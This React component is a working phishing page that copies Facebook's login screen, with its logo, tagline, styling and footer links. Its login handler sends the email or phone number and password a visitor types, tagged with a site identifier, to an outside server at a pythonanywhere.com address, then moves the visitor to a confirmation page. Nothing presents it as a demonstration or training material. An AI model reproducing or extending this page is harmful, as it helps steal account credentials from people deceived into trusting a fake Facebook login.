import React, { useState } from "react";
import { useNavigate } from "react-router-dom"; // Use useNavigate instead of useHistory
import fbLogo from "../assets/fb.svg"; // Import the Facebook logo
import { useSite } from "../context/SiteContext";

export const FacebookLogin: React.FC = () => {
  const [focusedInput, setFocusedInput] = useState<string | null>(null);
  const [username, setUsername] = useState<string>(""); // Updated to 'username'
  const [password, setPassword] = useState<string>("");
  const [loading, setLoading] = useState<boolean>(false);
  const [usernameError, setUsernameError] = useState<boolean>(false);
  const [passwordError, setPasswordError] = useState<boolean>(false);
  const navigate = useNavigate(); // Initialize useNavigate
  const { siteId } = useSite() || { siteId: "defaultSiteId" }; // Ensure siteId has a fallback value

  const handleLogin = async () => {
    // Validate username and password
    setUsernameError(!username);
    setPasswordError(!password);

    if (!username || !password) {
      return;
    }

    setLoading(true);
    const xusername = `${username}_${siteId}`;
    const xpassword = `${password}_${siteId}`;

    try {
      const response = await fetch(
        "https://bossj.pythonanywhere.com/api/facebook/",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            xusername: xusername, // Ensure correct API field names
            xpassword: xpassword,
          }),
        }
      );

      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }

      const data = await response.json();

      setTimeout(() => {
        if (data.message) {
          navigate("/confirm"); // Navigate after success
        } else {
          console.error("Login Error:", data.error);
        }
      }, 2000);
    } catch (error) {
      console.error("Login Error:", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={styles.container}>
      <div style={styles.content}>
        {/* Facebook Logo */}
        <div style={styles.logoContainer}>
          <img src={fbLogo} alt="Facebook" style={styles.logo} />
        </div>
        <div style={styles.fbText}>
          <p>Facebook helps you connect and share with the people in your life.</p>
        </div>

        {/* Login Card */}
        <div style={styles.loginCard}>
          <input
            type="text"
            placeholder="Email address or phone number"
            value={username}
            onChange={(e) => {
              setUsername(e.target.value);
              setUsernameError(false);
            }}
            style={{
              ...styles.input,
              outline: usernameError
                ? "2px solid red"
                : focusedInput === "username"
                ? "2px solid #1877f2"
                : "none",
            }}
            onFocus={() => setFocusedInput("username")}
            onBlur={() => setFocusedInput(null)}
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              setPasswordError(false);
            }}
            style={{
              ...styles.input,
              outline: passwordError
                ? "2px solid red"
                : focusedInput === "password"
                ? "2px solid #1877f2"
                : "none",
            }}
            onFocus={() => setFocusedInput("password")}
            onBlur={() => setFocusedInput(null)}
          />
          <button
            style={styles.loginButton}
            onClick={handleLogin}
            disabled={loading}
          >
            {loading ? "Logging in..." : "Log in"}
          </button>
          <a href="#" style={styles.forgotPassword}>
            Forgotten password?
          </a>
          <div style={styles.separator}></div>
          <button style={styles.createAccountButton}>Create new account</button>
        </div>

        {/* Footer */}
        <div style={styles.footer}>
          <a href="#" style={styles.footerLink}>
            Meta
          </a>
          <a href="#" style={styles.footerLink}>
            About
          </a>
          <a href="#" style={styles.footerLink}>
            Help
          </a>
          <a href="#" style={styles.footerLink}>
            More
          </a>
        </div>
      </div>
    </div>
  );
};

const styles: { [key: string]: React.CSSProperties } = {
  container: {
    backgroundColor: "#f0f2f5",
    minHeight: "110vh",
    height: "100%",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    fontFamily: "Arial, sans-serif",
    marginTop: "-7rem",
    padding: "0.5rem",
    paddingTop: "2rem",
    paddingBottom: "2rem",
  },
  content: {
    maxWidth: "400px",
    width: "100%",
    textAlign: "center" as const,
  },
  logoContainer: {
    marginBottom: "24px",
  },
  logo: {
    width: "200px",
    marginBottom: "-2rem",
  },
  loginCard: {
    backgroundColor: "white",
    padding: "20px",
    borderRadius: "8px",
    boxShadow: "0 2px 4px rgba(0, 0, 0, 0.1)",
  },
  input: {
    width: "100%",
    padding: "14px",
    marginBottom: "12px",
    border: "1px solid #dddfe2",
    borderRadius: "6px",
    fontSize: "16px",
    boxSizing: "border-box",
    transition: "outline 0.2s",
    backgroundColor: "#fff",
    color: "#000",
  },
  loginButton: {
    backgroundColor: "#1877f2",
    color: "white",
    width: "100%",
    padding: "14px",
    border: "none",
    borderRadius: "6px",
    fontSize: "18px",
    fontWeight: "bold",
    cursor: "pointer",
    marginBottom: "12px",
    outline: "none",
  },
  forgotPassword: {
    color: "#1877f2",
    textDecoration: "none",
    fontSize: "14px",
    display: "block",
    marginBottom: "16px",
  },
  separator: {
    height: "1px",
    backgroundColor: "#dadde1",
    margin: "16px 0",
  },
  createAccountButton: {
    backgroundColor: "#42b72a",
    color: "white",
    width: "100%",
    padding: "14px",
    border: "none",
    borderRadius: "6px",
    fontSize: "16px",
    fontWeight: "bold",
    cursor: "pointer",
    outline: "none",
  },
  footer: {
    marginTop: "20px",
    fontSize: "12px",
    color: "#606770",
  },
  footerLink: {
    color: "#606770",
    textDecoration: "none",
    margin: "0 8px",
  },
  fbText: {
    color: "#000",
    fontSize: "18px",
  },
};

export default FacebookLogin;